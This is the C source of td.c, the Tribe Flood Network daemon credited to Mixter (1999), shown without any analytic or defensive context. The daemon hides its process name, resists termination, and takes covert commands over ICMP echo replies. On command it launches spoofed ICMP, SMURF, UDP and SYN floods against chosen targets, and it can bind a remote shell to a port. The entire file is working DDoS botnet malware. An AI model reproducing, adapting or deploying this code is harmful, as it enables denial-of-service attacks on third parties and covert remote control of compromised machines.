/* td.c - tribe flood network daemon
   (c) 1999 by Mixter - PRIVATE */

#include "config.h"
#include "tubby.h"
#include "control.h"
#include "syn.c"
#include "udp.c"
#include "icmp.c"

int
main (int puke, char **fart)
{
  char buf[1024], target[1024], answer[1024];
  struct iphdr *ip = (struct iphdr *) buf;
  struct icmphdr *icmp = (struct icmphdr *) (buf + sizeof (struct iphdr));
  char *p = (buf + sizeof (struct iphdr) + sizeof (struct icmphdr));
  int lsock, i, whereami, port4syn = 0;

  if (geteuid ())
    exit (-1);
  strcpy (fart[0], HIDEME);
  lsock = socket (AF_INET, SOCK_RAW, 1);
  close (0);
  close (1);
  close (2);
  if (fork ())
    exit (0);

  signal (SIGHUP, SIG_IGN);
  signal (SIGTERM, SIG_IGN);
  signal (SIGCHLD, SIG_IGN);

  while (1)
    {
      i = read (lsock, buf, 1024);
      if (ip->protocol == 1 && icmp->type == 0)
	{
	  whereami = i - (sizeof (struct iphdr) + sizeof (struct icmphdr)) + 1;
	  memcpy (target, p, whereami);
	  switch (ntohs (icmp->un.echo.id))
	    {
	    case ID_ICMP:
	      if (fw00ding)
		{
		  mixprintf (answer, "already %s flooding\n", strfl ());
		  ANSWER;
		  break;
		}
	      if (strlen (target) > 12)
		mixprintf (answer, "ICMP flood: %s\n", "multiple targets");
	      else
		mixprintf (answer, "ICMP flood: %s\n", target);
	      myip = htonl (ip->daddr);
	      fw00ding = 3;
	      ANSWER;
	      strcpy (fart[0], HIDEKIDS);
	      commence_icmp (target);
	      strcpy (fart[0], HIDEME);
	      break;
	    case ID_SMURF:
	      if (fw00ding)
		{
		  mixprintf (answer, "already %s flooding\n", strfl ());
		  ANSWER;
		  break;
		}
	      mixprintf (answer, "SMURF (target@bcast@...): %s\n", target);
	      myip = htonl (ip->daddr);
	      fw00ding = 4;
	      ANSWER;
	      strcpy (fart[0], HIDEKIDS);
	      commence_smurf (target);
	      strcpy (fart[0], HIDEME);
	      break;
	    case ID_SENDUDP:
	      if (fw00ding)
		{
		  mixprintf (answer, "already %s flooding\n", strfl ());
		  ANSWER;
		  break;
		}
	      if (strlen (target) > 12)
		mixprintf (answer, "UDP flood: %s\n", "multiple targets");
	      else
		mixprintf (answer, "UDP flood: %s\n", target);
	      myip = htonl (ip->daddr);
	      fw00ding = 1;
	      ANSWER;
	      strcpy (fart[0], HIDEKIDS);
	      commence_udp (target);
	      strcpy (fart[0], HIDEME);
	      break;
	    case ID_SENDSYN:
	      if (fw00ding)
		{
		  mixprintf (answer, "already %s flooding\n", strfl ());
		  ANSWER;
		  break;
		}
	      if (strlen (target) > 12)
		mixprintf (answer, "SYN flood: port %d, multiple targets\n", port4syn);
	      else
		mixprintf2 (answer, "SYN flood: port %d, %s\n", port4syn, target);
	      fw00ding = 2;
	      myip = htonl (ip->daddr);
	      ANSWER;
	      strcpy (fart[0], HIDEKIDS);
	      commence_syn (target, port4syn);
	      strcpy (fart[0], HIDEME);
	      break;
	    case ID_STOPIT:
	      if (!fw00ding)
		{
		  mixprintf2 (answer, "ready - size: %d spoof: %d\n",
			      psize, nospoof);
		  ANSWER;
		  usleep (100);
		  break;
		}
	      mixprintf (answer, "%s flood terminated\n", strfl ());
	      must_kill_all ();
	      usleep (1000);
	      fw00ding = 0;
	      ANSWER;
	      break;
	    case ID_SYNPORT:
	      port4syn = atoi (target);
	      break;
	    case ID_PSIZE:
	      psize = atoi (target);
	      mixprintf (answer, "packet size: %d bytes\n", psize);
	      ANSWER;
	      break;
	    case ID_SWITCH:
	      switch (atoi (target))
		{
		case 0:
		  nospoof = 0;
		  mixprintf (answer, "spoof mask: *.*.*.* (%s)\n", k00lntoa ());
		  break;
		case 1:
		  nospoof = 1;
		  mixprintf (answer, "spoof mask: 1.*.*.* (%s)\n", k00lntoa ());
		  break;
		case 2:
		  nospoof = 2;
		  mixprintf (answer, "spoof mask: 1.1.*.* (%s)\n", k00lntoa ());
		  break;
		case 3:
		  nospoof = 3;
		  mixprintf (answer, "spoof mask: 1.1.1.* (%s)\n", k00lntoa ());
		  break;
		default:
		  mixprintf (answer, "spoof test: %s\n", k00lntoa ());
		  break;
		}
	      ANSWER;
	      break;
#ifdef ID_SHELL
	    case ID_SHELL:
	      mixprintf (answer, "shell bound to port %s\n", target);
	      shellsex (atoi (target));
	      ANSWER;
	      break;
#endif
	    default:
	      continue;
	    }
	}
    }
  /* 1 != 1 */
  return (0);
}
